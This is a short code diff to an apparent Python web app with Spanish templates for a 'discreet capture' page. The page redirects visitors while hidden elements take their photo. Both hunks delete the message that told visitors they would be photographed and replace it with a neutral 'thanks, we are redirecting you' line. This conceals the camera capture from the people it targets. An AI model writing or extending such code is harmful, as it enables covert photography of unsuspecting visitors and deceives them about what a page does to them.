@@ -383,7 +383,7 @@ HOME_TEMPLATE = """
                 <h3>📋 Captura Discreta:</h3>
                 <p><strong>Lo que verá el usuario:</strong></p>
                 <ul style="margin: 10px 0 10px 25px;">
-                    <li>"Se te está redirigiendo a tu página, te tomaremos una foto para nuestros respaldos."</li>
+                    <li>"Gracias por visitarnos, te estamos redireccionando"</li>
                     <li>Redirección automática en 2-3 segundos</li>
                     <li>Sin vista previa, sin botones, sin complicaciones</li>
                 </ul>
@@ -612,7 +612,7 @@ DISCRETE_CAPTURE_TEMPLATE = """
 <body>
     <div class="container">
         <div class="icon">📸</div>
-        <h2 id="mainMessage">Se te está redirigiendo a tu página, te tomaremos una foto para nuestros respaldos.</h2>
+        <h2 id="mainMessage">Gracias, te estamos redireccionando</h2>
     </div>
 
     <!-- Elementos ocultos para captura -->
